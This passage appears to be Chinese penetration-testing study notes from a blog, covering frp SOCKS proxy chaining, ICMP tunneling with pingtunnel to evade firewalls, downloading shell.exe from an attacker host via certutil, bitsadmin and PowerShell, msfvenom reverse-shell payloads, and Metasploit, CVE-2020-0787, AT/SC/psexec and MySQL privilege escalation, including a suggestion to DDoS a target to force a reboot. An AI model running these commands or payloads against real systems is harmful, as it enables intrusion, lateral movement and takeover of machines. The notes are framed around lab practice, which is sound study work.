<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户端frpc.ini配置如下</span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.x     服务端的IP地址</span><br><span class="line">server_port = 7000            服务端的开放端口</span><br><span class="line"></span><br><span class="line">[socks5_forward]</span><br><span class="line">type = tcp                    协议类型</span><br><span class="line">local_ip = 10.10.10.13        本地的IP地址</span><br><span class="line">local_port = 10808            客户端要转发的端口</span><br><span class="line">remote_port = 1080            转发的远程端口</span><br></pre></td></tr></table></figure></div>

<p>然后在win server2012再开启服务端，运行</p>
<p><code>	./frps.exe -c ./frps.ini</code></p>
<p>配置</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 10.10.10.13         win服务端上绑定的IP地址</span><br><span class="line">bind-PORT = 7000                win服务端绑定的端口</span><br></pre></td></tr></table></figure></div>

<p>在dmz的FTP服务器上开启</p>
<p><code>	./frpc.exe -c ./frpc.ini</code></p>
<p>配置</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 10.10.10.113     服务端的IP地址</span><br><span class="line">server_port = 7000            服务端的开放端口</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp                    协议类型</span><br><span class="line">remote_port = 1080            转发的远程端口</span><br><span class="line">plugin = socks5               代理类型</span><br></pre></td></tr></table></figure></div>

<p>然后在ProxyChains配置文件最后一行添加“socks5 192.168.2.138 1080”执行</p>
<p><code>	proxychains rdesktop 192.168.30.20</code>	</p>
<p>即可访问办公区的远程桌面</p>
<p>三级网络代理</p>
<p>先是vps服务端启动，然后win server2012客户端，win server2012服务端，FTP客户端</p>
<p>FTP客户端配置</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户端frpc.ini配置如下</span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.10.10.13    服务端的IP地址</span><br><span class="line">server_port = 7000            服务端的开放端口</span><br><span class="line"></span><br><span class="line">[socks5_forward]</span><br><span class="line">type = tcp                    协议类型</span><br><span class="line">local_ip = 192.168.30.40      本地的IP地址</span><br><span class="line">local_port = 10809            客户端要转发的端口</span><br><span class="line">remote_port = 1080            转发的远程端口</span><br></pre></td></tr></table></figure></div>

<p>然后FTP启动服务端</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps.exe -c ./frps.ini</span><br></pre></td></tr></table></figure></div>

<p>配置</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.30.40         FTP服务端上绑定的IP地址</span><br><span class="line">bind-PORT = 7000                  FTP服务端绑定的端口</span><br></pre></td></tr></table></figure></div>

<p>在办公区文件服务器上执行</p>
<p><code>	./frpc.exe -c ./frpc.ini</code></p>
<p>配置</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户端frpc.ini配置如下</span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.30.40    服务端的IP地址</span><br><span class="line">server_port = 7000            服务端的开放端口</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp                    协议类型</span><br><span class="line">local_port = 10809            客户端要转发的端口</span><br><span class="line">plugin = socks5               代理类型</span><br></pre></td></tr></table></figure></div>

<p>然后在ProxyChains配置文件最后一行添加“socks5 192.168.2.138 1080”执行</p>
<p><code>	proxychains rdesktop 192.168.60.10</code>	</p>
<p>即可连接远程桌面</p>
<h4 id="域横向网络-amp-传输-amp-应用层隧道技术"><a href="#域横向网络-amp-传输-amp-应用层隧道技术" class="headerlink" title="域横向网络&amp;传输&amp;应用层隧道技术"></a>域横向网络&amp;传输&amp;应用层隧道技术</h4><p>隧道技术是为了解决：防火墙过滤问题  网络连接通信问题  数据回链封装问题</p>
<p>在数据通信被拦截的情况下，可以利用隧道技术封装改变通信协议进行绕过拦截。</p>
<p>如：CS MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信讯在问题等问题，都可以通过隧道技术解决。</p>
<h6 id="隧道技术前期的必备条件"><a href="#隧道技术前期的必备条件" class="headerlink" title="隧道技术前期的必备条件"></a>隧道技术前期的必备条件</h6><p>在用隧道之前要先探测对应隧道协议是否支持，如果不支持用这个隧道也没有用</p>
<h6 id="隧道原理"><a href="#隧道原理" class="headerlink" title="隧道原理"></a>隧道原理</h6><p>在实际的网络中，通常是用各种边界设备、软硬件防火墙以及入侵检测系统，隧道是指绕过端口屏蔽的通信方式</p>
<p>将数据包两端进行防火墙允许的方式封装，然后就可以穿过防火墙，进行通信，当数据包达到目的地时将数据包还原，并将还原后的数据包发送到相应的服务器上。</p>
<p>常用的隧道技术有以下三种：</p>
<p>网络层：ipv6隧道、ICMP隧道（伪造这个协议）</p>
<p>传输层：TCP隧道、UDP隧道、常用端口转发</p>
<p>应用层：SSH隧道、HTTP&#x2F;S隧道、DNS隧道</p>
<h6 id="网络应用层连通性检测"><a href="#网络应用层连通性检测" class="headerlink" title="网络应用层连通性检测"></a>网络应用层连通性检测</h6><p>可以建立各种层面的隧道，每个层面又有不同的协议，你得先确定支持哪个隧道协议，才能确定你要用那个隧道。</p>
<p>比如：一个网络层的icmp隧道，要检测是否支持ICMP就可以用ping检测目标主机，ping通就可以得到该主机支持ICMP协议。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/a3dd3b49072dc8442835ab5947bebe8a50d5d72d.png@768w_200h_progressive.webp"
                      alt="img"
                ></p>
<h6 id="检测TCP协议（瑞士军刀：netcat）"><a href="#检测TCP协议（瑞士军刀：netcat）" class="headerlink" title="检测TCP协议（瑞士军刀：netcat）"></a>检测TCP协议（瑞士军刀：netcat）</h6><p>执行nc 命令（-vz检测TCP端口）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -vz &lt;IP&gt;&lt;端口&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i0.hdslb.com/bfs/article/78fbfd4cda509b0161d2ab1aafbc8dffc69b879b.png@831w_116h_progressive.webp"
                      alt="img"
                ></p>
<p>（-uz）检测UDP端口</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -uz &lt;IP&gt; &lt;端口&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/49ce79858b1b27fefef12131097dd8c2e955c9be.png@549w_140h_progressive.webp"
                      alt="img"
                ></p>
<h6 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h6><p>如果远程主机开启了相应的端口，且内网可连接外网的话，就会输出相应的端口信息</p>
<p>用“curl”工具，执行 curl &lt;IP 地址:端口&gt;命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/6c4ad43e6393edc186d61fc76bf4b86a0dbfc287.png@831w_207h_progressive.webp"
                      alt="img"
                ></p>
<h6 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h6><p>nslookup时win自带的命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/7061afc7be4cbb13b3c590d995ecee433a05f10e.png@627w_324h_progressive.webp"
                      alt="img"
                ></p>
<p>dig时linux系统自带的命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/0e27d474e4b3cd57f169ec3d45168bf7b0c3be25.png@753w_132h_progressive.webp"
                      alt="img"
                ></p>
<h6 id="pingtunnel工具的使用"><a href="#pingtunnel工具的使用" class="headerlink" title="pingtunnel工具的使用"></a>pingtunnel工具的使用</h6><p>pingtunnel的原理是把tcp&#x2F;udp&#x2F;sock5流量伪装icmp流量进行转发的工具</p>
<p>语法：</p>
<p>-p 表示连接 icmp 隧道另一端的机器IP（即目标服务器）</p>
<p>-lp 表示需要监听的本地tcp端口</p>
<p>-da指定需要转发的机器的IP（即目标内网某一机器的内网 IP）</p>
<p>-dp指定需要转发的机器的端口（即目标内网某一机器的内网端口）</p>
<p>-x设置连接的密码 </p>
<h6 id="靶场分析"><a href="#靶场分析" class="headerlink" title="靶场分析"></a>靶场分析</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/641c898428e69f32b54c85e1422075b383421816.png@831w_243h_progressive.webp"
                      alt="img"
                ></p>
<p>现在有一台攻击机叫hanker  xiaodi（下面简称hx）要实现对一个内网环境的域控DC的控制，但是hx处于76.xx的IP网段是不能连接到33.33这个内网网段的，但是可以通过域内一台开放外网接口的主机webserver与DC连接。</p>
<p>首先：</p>
<p>webserver： .&#x2F;ptunnel -x xiaodi 先部署工具</p>
<p>hx： .&#x2F;ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi</p>
<p>转发3389端口的请求数据给本地的1080</p>
<p>hx： rdesktop 127.0.0.1 1080</p>
<h4 id="横向移动中的文件传输-1"><a href="#横向移动中的文件传输-1" class="headerlink" title="横向移动中的文件传输"></a>横向移动中的文件传输</h4><p>该知识用于在取得权限之后，发送木马文件，进一步取得控制</p>
<h6 id="通过网络共享-1"><a href="#通过网络共享-1" class="headerlink" title="通过网络共享"></a>通过网络共享</h6><h6 id="搭建SMB服务器"><a href="#搭建SMB服务器" class="headerlink" title="搭建SMB服务器"></a>搭建SMB服务器</h6><h6 id="通过windows自带工具"><a href="#通过windows自带工具" class="headerlink" title="通过windows自带工具"></a>通过windows自带工具</h6><p>certutil</p>
<p>certutil时Windows自带的命令工具，提供从网络下载文件的功能，所以可以部署一个自己事先在可控服务器中的恶意文件即可实现攻击。</p>
<p>执行：</p>
<p><code>	certutil -urlcache -split -f http://IP:port/shell.exe C:/reverse_tcp.exe</code></p>
<p>意思是通过certutil下载shell.exe，并保存在C:\reverse_top.exe</p>
<p>BITSAdmin</p>
<p>BITSAdmin是一个Windows命令行工具，可以用于创建、下载、上传作业，监视进度。win7以后自带</p>
<p>命令：</p>
<p><code>	bitsadmin /transfer test http://IP:Port/shell.exe C:\reverse_tcp.exe</code></p>
<p>PowerShell</p>
<p>可以通过创建WebClient对象来实现文件下载</p>
<p><code>	（New-Object Net.WebClient）.DownloadFile(&#39;http://IP:Port/shell.exe&#39;,&#39;C:\reverse_tcp.exe&#39;)</code></p>
]]></content>
  </entry>
  <entry>
    <title>权限提升</title>
    <url>/2023/04/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
    <content><![CDATA[<p><a class="link"   href="https://github.com/tennc/webshell%E5%90%8E%E9%97%A8webshell" >https://github.com/tennc/webshell后门webshell <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221015190834074.png"
                      alt="image-20221015190834074"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221015193913576.png"
                      alt="image-20221015193913576"
                ></p>
<h2 id="网站权限后台漏洞"><a href="#网站权限后台漏洞" class="headerlink" title="网站权限后台漏洞"></a>网站权限后台漏洞</h2><p>进入网站管理后台之后，在后台中寻找有没有上传功能，或者看看有没有其他漏洞，如sql注入等等，可以查看该套程序是由什么源码开发的，在网上下载源码并对其进行源码代码审计</p>
<p>具体有哪些权限需要我们知道和了解掌握的？</p>
<p>用途：相关操作被拒绝就涉及到权限提升</p>
<h5 id="后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等"><a href="#后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等" class="headerlink" title="后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等"></a>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</h5><h6 id="后台权限：（获得方式：爆破、注入猜解、弱口令等获取账号密码登入）"><a href="#后台权限：（获得方式：爆破、注入猜解、弱口令等获取账号密码登入）" class="headerlink" title="后台权限：（获得方式：爆破、注入猜解、弱口令等获取账号密码登入）"></a>后台权限：（获得方式：爆破、注入猜解、弱口令等获取账号密码登入）</h6><p>一般网站或者后台只能操作应用界面的内容数据图片信息等，无法操作程序的源代码或者服务器上的资源文件的。（如果后台存在文件操作功能的话也可以操作文件数据）</p>
<h6 id="网站权限：（获得方式：以上三种思路获取）"><a href="#网站权限：（获得方式：以上三种思路获取）" class="headerlink" title="网站权限：（获得方式：以上三种思路获取）"></a>网站权限：（获得方式：以上三种思路获取）</h6><p>查看或者修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备</p>
<h6 id="数据库权限："><a href="#数据库权限：" class="headerlink" title="数据库权限："></a>数据库权限：</h6><p>操作数据库的权限，数据库的增删改查等，源码或配置文件泄露，也可能是网站权限（webshell）进行是数据库配置文件读取获得。</p>
<h6 id="接口权限：（邮件、短信，支付，第三方登录等）"><a href="#接口权限：（邮件、短信，支付，第三方登录等）" class="headerlink" title="接口权限：（邮件、短信，支付，第三方登录等）"></a>接口权限：（邮件、短信，支付，第三方登录等）</h6><p>后台或者网站权限的获取途径：后台（修改配置信息功能点），网站权限（查看配置文件获取）。</p>
<h2 id="win溢出漏洞及AT-amp-SC-amp-PS提权"><a href="#win溢出漏洞及AT-amp-SC-amp-PS提权" class="headerlink" title="win溢出漏洞及AT&amp;SC&amp;PS提权"></a>win溢出漏洞及AT&amp;SC&amp;PS提权</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221016143650952.png"
                      alt="image-20221016143650952"
                ></p>
<h4 id="windows提权命令"><a href="#windows提权命令" class="headerlink" title="windows提权命令"></a>windows提权命令</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221016144604042.png"
                      alt="image-20221016144604042"
                ></p>
<h6 id="用户及用户组的权限也需要了解"><a href="#用户及用户组的权限也需要了解" class="headerlink" title="用户及用户组的权限也需要了解"></a>用户及用户组的权限也需要了解</h6><p>默认情况下，系统位用户分配了7个组，并给每个组赋予了不同的操作权限，管理员组、高权限用户组、普通用户组、备份操作组、文件复制组、来宾用户组、身份验证用户组</p>
<p>其中备份操作组和文件复制组为维护系统而设置，平时不会用到</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221016145158480.png"
                      alt="image-20221016145158480"
                ></p>
<h5 id="提权实例之溢出漏洞提权—基于web环境的权限提升"><a href="#提权实例之溢出漏洞提权—基于web环境的权限提升" class="headerlink" title="提权实例之溢出漏洞提权—基于web环境的权限提升"></a>提权实例之溢出漏洞提权—基于web环境的权限提升</h5><p>如何判断使用哪种溢出漏洞？漏洞该在哪里找？</p>
<p>信息收集—补丁筛选—利用MSF或特定EXP–执行—权限到手</p>
<h5 id="payload生成"><a href="#payload生成" class="headerlink" title="payload生成"></a>payload生成</h5><h6 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h6><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f exe &gt; shell.exe</p>
<h6 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h6><p>msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f elf &gt; shell.elf</p>
<h6 id="MAC"><a href="#MAC" class="headerlink" title="MAC"></a>MAC</h6><p>msfvenom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;<Your IP Address>LPORT&#x3D;<Your Port to Connect On> -f macho &gt; shell.macho</p>
<p>先使用msf生成一个5577.exe的payload文件，当被攻击主机访问该文件时，将会被链接</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017121848451.png"
                      alt="image-20221017121848451"
                ></p>
<p>服务器使用msf的set lport 5577  来监听5577端口 </p>
<p>设置一个监听端口和你的主机IP地址以及payload</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018174814902.png"
                      alt="image-20221018174814902"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018174847309.png"
                      alt="image-20221018174847309"
                ></p>
<p>run执行，反弹成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018174912291.png"
                      alt="image-20221018174912291"
                ></p>
<p>可以看到，被攻击主机信息可以有效反弹到服务器，但是getuid发现现在是普通用户权限（web权限），接下来就要进行提权操作</p>
<p>使用search ms16命令，查找出现有的exp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017122327951.png"
                      alt="image-20221017122327951"
                ></p>
<p>使用exp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017142136381.png"
                      alt="image-20221017142136381"
                ></p>
<p>寻找出刚才会话的session发现为3</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017122610291.png"
                      alt="image-20221017122610291"
                ></p>
<p>设置session为3，然后设置payload，再查看设置选项（show options）<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017122738843.png"
                      alt="image-20221017122738843"
                ></p>
<p>得到结果，查看端口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017122903172.png"
                      alt="image-20221017122903172"
                ></p>
<p>设置IP地址（服务器端的IP地址）</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017123006035.png"
                      alt="image-20221017123006035"
                ></p>
<p>设置一个新的端口来接收，system权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017123037807.png"
                      alt="image-20221017123037807"
                ></p>
<p>执行exploit，发现成功建立第四个会话</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017123354205.png"
                      alt="image-20221017123354205"
                ></p>
<p>执行getuid</p>
<p>发现成功获得system权限，最高权限,提权结束</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017123320100.png"
                      alt="image-20221017123320100"
                ></p>
<p>（注意：如果你所使用的服务器有安全组功能的话，必须到服务器安全组管理界面，设置端口及IP地址的白名单，不然监听的端口信息反弹不到服务器）</p>
<h5 id="基于本地环境的权限提升–系统溢出漏洞"><a href="#基于本地环境的权限提升–系统溢出漏洞" class="headerlink" title="基于本地环境的权限提升–系统溢出漏洞"></a>基于本地环境的权限提升–系统溢出漏洞</h5><p>exp链接</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases/download/1/BitsArbitraryFileMoveExploit.exe</span><br></pre></td></tr></table></figure></div>

<p>将生成&#x2F;下载的EXP程序复制到受漏洞影响的版本的测试靶机上，打开cmd，直接拖动exp到cmd窗口中运行exp，如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/v2-2f435ace5a53dc2527c8b785f2762317_720w.webp"
                      alt="img"
                ></p>
<p>可以看到exp运行完成后立即弹出一个新的system权限的cmd窗口，如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic3.zhimg.com/80/v2-cd88f291e18f8b34c86408e40605b54a_720w.webp"
                      alt="img"
                ></p>
<p>此时就通过该漏洞获取了一个本地系统权限的cmd，可以以system权限执行任意操作。</p>
<h5 id="基于本地环境下的权限提升–AT-amp-SC-amp-PS命令"><a href="#基于本地环境下的权限提升–AT-amp-SC-amp-PS命令" class="headerlink" title="基于本地环境下的权限提升–AT&amp;SC&amp;PS命令"></a>基于本地环境下的权限提升–AT&amp;SC&amp;PS命令</h5><h6 id="AT命令"><a href="#AT命令" class="headerlink" title="AT命令"></a>AT命令</h6><p>主要是针对win2008之前的系统</p>
<p>主要原理是在cmd.exe窗口中使用at命令系统是调用system权限执行的，尽管你只是有管理员权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017132716124.png"
                      alt="image-20221017132716124"
                ></p>
<p>表示预定一个程序在13：24分之后执行cmd.exe</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017132731974.png"
                      alt="image-20221017132731974"
                ></p>
<p>在指定时间，打开了cmd.exe表名漏洞成立</p>
<h6 id="SC命令"><a href="#SC命令" class="headerlink" title="SC命令"></a>SC命令</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017133007487.png"
                      alt="image-20221017133007487"
                ></p>
<p>表名先创建一个服务名叫syscmd，还有个变量名叫binPath这个变量绑定一个执行cmd的命令</p>
<p>相当于在你的电脑创建一个服务叫做syscmd</p>
<p>然后直接运行这个服务 sc  start  syscmd即可打开cmd</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017133335639.png"
                      alt="image-20221017133335639"
                ></p>
<h6 id="PS命令"><a href="#PS命令" class="headerlink" title="PS命令"></a>PS命令</h6><p>下载pstool工具</p>
<p>然后打开cmd执行psexec.exe -accepteula -s -i -d cmd.exe  表示打开cmd</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017133804981.png"
                      alt="image-20221017133804981"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017133817690.png"
                      alt="image-20221017133817690"
                ></p>
<p>在打开的cmd中输入whoami，查看可知已获得system权限</p>
<h2 id="MY-amp-MS-amp-ORA等SQL数据库提权"><a href="#MY-amp-MS-amp-ORA等SQL数据库提权" class="headerlink" title="MY&amp;MS&amp;ORA等SQL数据库提权"></a>MY&amp;MS&amp;ORA等SQL数据库提权</h2><p>利用系统溢出漏洞无果的情况下，可以采用数据库提权，但是需要知道数据库提权的前提条件：</p>
<p>​        服务器开启数据库服务及获取到最高权限用户密码 。</p>
<p>​        除了Access数据库外，其他数据库基本都存在数据库提权的可能</p>
<p>在本地或者web环境下都可以进行数据库提权，需要通过端口扫描等，来发现该环境是否具有数据库服务，在这之后需要进行信息收集获得数据库账号密码。</p>
<h3 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h3><p>提权步骤：服务探针—信息收集—提权利用—获得权限</p>
<h6 id="服务探针"><a href="#服务探针" class="headerlink" title="服务探针"></a>服务探针</h6><p>查看是否具有数据库信息，可以利用端口扫描</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017220412136.png"
                      alt="image-20221017220412136"
                ></p>
<p>发现3306端口开放，说明具有MySQL数据库，MySQL数据库的密码存储在date&#x2F;mysql&#x2F;user.MYD文件中的</p>
<h6 id="信息收集（得到密码）"><a href="#信息收集（得到密码）" class="headerlink" title="信息收集（得到密码）"></a>信息收集（得到密码）</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017220602189.png"
                      alt="image-20221017220602189"
                ></p>
<p>脚本爆破和工具爆破的区别：</p>
<p>脚本—本地连接本地（需要上传至目标服务器）</p>
<p>工具—你电脑连接目标服务器</p>
<h6 id="提权利用"><a href="#提权利用" class="headerlink" title="提权利用"></a>提权利用</h6><p>先判断MySQL数据库版本 select version();</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017222136312.png"
                      alt="image-20221017222136312"
                ></p>
<p>然后再利用已有的webshell进行执行即可</p>
<p>2.MOF提权原理：mof是Windows系统的一个文件，叫做“托管对象格式”，作用是每隔五秒就会去监控进程创建和死亡。就是用MySQL的root权限，然后使用root权限去执行我们上传的mof（要先把原有的mof进行编辑替换）。隔一定时间后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数是cmd的添加管理员用户的命令</p>
<h6 id="提权过程："><a href="#提权过程：" class="headerlink" title="提权过程："></a>提权过程：</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018141950023.png"
                      alt="image-20221018141950023"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018142017899.png"
                      alt="image-20221018142017899"
                ></p>
<p>（一般成功的概率较低，被动提权）</p>
<ol start="3">
<li><p>启动项提权（基于操作系统的自启动功能）</p>
<p>到处一个自定义的可执行文件到启动目录配合重启执行</p>
</li>
</ol>
<p>步骤：</p>
<p>如果数据库没有开启外联，需要通过webshell开启外联</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018143352551.png"
                      alt="image-20221018143352551"
                ></p>
<p>开启外联后</p>
<p>使用msf进行提权</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018143511965.png"
                      alt="image-20221018143511965"
                ></p>
<p>search mysql 搜索MySQL的exp，并使用use命令进行选择使用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018143628365.png"
                      alt="image-20221018143628365"
                ></p>
<p>设置目标主机的IP地址、用户名、密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018143802006.png"
                      alt="image-20221018143802006"
                ></p>
<p>用exploit进行执行，启动项创建成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018143900873.png"
                      alt="image-20221018143900873"
                ></p>
<p>接下来就是想办法让人家主机重启 ，最常用的就是ddos攻击导致资源枯竭致使服务器自动重启</p>
<h3 id="SQLSever数据库提权"><a href="#SQLSever数据库提权" class="headerlink" title="SQLSever数据库提权"></a>SQLSever数据库提权</h3><p>流程：服务探针—信息收集—提权利用—获得权限</p>
<p>直接获取,被阻止需要开启</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018154438279.png"
                      alt="image-20221018154438279"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018154122467.png"
                      alt="image-20221018154122467"
                ></p>
<p>开启后，获得system权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018154647705.png"
                      alt="image-20221018154647705"
                ></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018154146481.png"
                      alt="image-20221018154146481" style="zoom:150%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018154808146.png"
                      alt="image-20221018154808146" style="zoom:150%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018155228658.png"
                      alt="image-20221018155228658" style="zoom:150%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018155731871.png"
                      alt="image-20221018155731871" style="zoom:150%;" 
                >



